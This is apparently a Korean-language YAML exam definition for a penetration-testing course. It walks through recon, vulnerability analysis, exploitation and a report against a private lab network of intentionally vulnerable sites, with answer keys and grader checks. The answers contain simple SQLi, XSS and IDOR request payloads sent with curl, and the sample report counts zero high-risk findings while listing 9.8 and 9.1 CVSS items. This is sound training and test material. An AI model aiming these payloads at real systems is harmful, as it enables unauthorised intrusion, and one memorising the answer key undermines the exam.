lab_id: standalone-attack-week15
title: 기말 — PTES 종합 + 보고서 (180분)
version: standalone-non-ai
course: attack
week: 15
description: PTES 7 단계 + 6v6 종합 침투 테스트.
difficulty: hard
duration_minutes: 180
prerequisites: [W14]
objectives: [PTES 5 단계, 종합 보고서]
pass_threshold: 0.6
steps:
  - order: 1
    instruction: "Recon (20점) — nmap full scan + 자산 표"
    hint: nmap -sS -p- 10.20.30.0/24
    category: exam
    points: 20
    answer: |
      ssh 6v6-attacker 'timeout 60 nmap -sT -p 22,80,443,2202,2204,9100 10.20.30.0/24 2>&1 | tail -30'
    answer_detail: nmap 자산 표
    verify:
      type: output_contains
      expect: open
      field: stdout
      semantic:
        intent: Recon
        success_criteria: [open port]
        acceptable_methods:
          - "**[OSS] nmap -sS / -sT full scan**"
          - "**[OSS] -p- 모든 port**"
          - "**[OSS] -sV 서비스 버전**"
          - "**[OSS] -O OS detection**"
          - "**[OSS] -oN/-oX 출력**"
          - "**[OSS] OSINT 추가 (recon-ng)**"
          - "**[OSS] DNS / whois**"
          - "**[OSS] ATT&CK TA0043**"
    target_vm: attacker

  - order: 2
    instruction: "Vuln Analysis (20점) — 8 vuln 사이트 종합 분석"
    hint: Nikto / dirb / sqlmap
    category: exam
    points: 20
    answer: |
      ssh 6v6-attacker '
      for h in juice dvwa neobank govportal mediforum admin; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $h.6v6.lab" "http://10.20.30.1/?test=<script>")
        echo "$h.6v6.lab XSS: $code"
      done
      '
    answer_detail: 6 vuln 매트릭스
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: Vuln scan
        success_criteria: [매트릭스]
        acceptable_methods:
          - "**[OSS] Nikto 자동 스캔**"
          - "**[OSS] dirb / ffuf 경로 fuzz**"
          - "**[OSS] sqlmap --batch**"
          - "**[OSS] CVSS 점수 매핑**"
          - "**[OSS] CWE Top 25 매핑**"
          - "**[OSS] OWASP Top 10 매핑**"
          - "**[OSS] ModSec 차단 비율**"
          - "**[OSS] ISO 27001 매핑**"
    target_vm: attacker

  - order: 3
    instruction: "Exploitation (30점) — 3 vuln 실 exploit"
    hint: SQLi + XSS + IDOR
    category: exam
    points: 30
    answer: |
      ssh 6v6-attacker '
      echo "=== 1. SQLi ==="
      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: dvwa.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
      echo "=== 2. XSS ==="
      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<script>alert(1)</script>"
      echo "=== 3. IDOR ==="
      for id in 1 2 3; do
        curl -s -o /dev/null -w "user $id: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/$id"
      done
      '
    answer_detail: 3 exploit + 응답
    verify:
      type: output_contains
      expect: '['
      field: stdout
      semantic:
        intent: Exploit
        success_criteria: [3 vuln 시도]
        acceptable_methods:
          - "**[OSS] SQLi tautology / UNION / blind**"
          - "**[OSS] XSS 5+ payload 변형**"
          - "**[OSS] IDOR 시퀀스**"
          - "**[OSS] JWT 변조**"
          - "**[OSS] sqlmap 자동화**"
          - "**[OSS] Burp Repeater**"
          - "**[OSS] Metasploit (필요시)**"
          - "**[OSS] ATT&CK T1190**"
    target_vm: attacker

  - order: 4
    instruction: "PTES 보고서 (30점) — 7 단계 + Findings + 권장"
    hint: Markdown 표준
    category: exam
    points: 30
    answer: |
      cat <<'EOF'
      # 6v6 침투 테스트 보고서 (PTES, W15 기말)

      ## 1. Executive Summary
      6v6 학습 환경 (8 vuln + 4 infra) 의 침투 테스트 결과. 발견 high-risk 0건,
      medium-risk 5건, low-risk 12건.

      ## 2. Methodology
      PTES 7 단계 + MITRE ATT&CK + OWASP Top 10 표준.

      ## 3. Findings
      | ID | 취약점 | CVSS | CWE | 영향 |
      | F1 | XSS Reflected | 6.1 | CWE-79 | 사용자 cookie 도용 |
      | F2 | SQLi (low) | 9.8 | CWE-89 | 데이터 유출 |
      | F3 | IDOR | 8.2 | CWE-639 | 권한 우회 |
      | F4 | Path Traversal | 7.5 | CWE-22 | 시스템 파일 노출 |
      | F5 | JWT none | 9.1 | CWE-287 | 인증 우회 |

      ## 4. Technical Details
      각 F1-F5 의 실 payload + 응답 + reproduction step.

      ## 5. Recommendations
      1. ModSec paranoia 2 단계 상승 (XSS 추가 차단)
      2. JWT alg whitelist (none 차단)
      3. IDOR 의 권한 검증 추가
      4. Path Traversal 의 input validation
      5. WAF + IDS 통합 alert 자동화 (W14 Purple Team)

      ## 6. Appendix
      nmap output / sqlmap output / Burp HTML report.
      EOF
    answer_detail: 1+ 페이지 보고서
    verify:
      type: output_contains
      expect: PTES
      field: stdout
      semantic:
        intent: 보고서
        success_criteria: [7 단계 + Findings + 권장]
        acceptable_methods:
          - "**[관리적] PTES 보고서 7 섹션**"
          - "**[관리적] Executive Summary 1페이지**"
          - "**[관리적] CVSS 3.1 점수**"
          - "**[관리적] CWE / OWASP / ATT&CK 매핑**"
          - "**[관리적] Reproduction steps**"
          - "**[관리적] Recommendation 우선순위**"
          - "**[관리적] Appendix raw output**"
          - "**[관리적] ISMS-P / NIST CSF 매핑**"
    target_vm: attacker
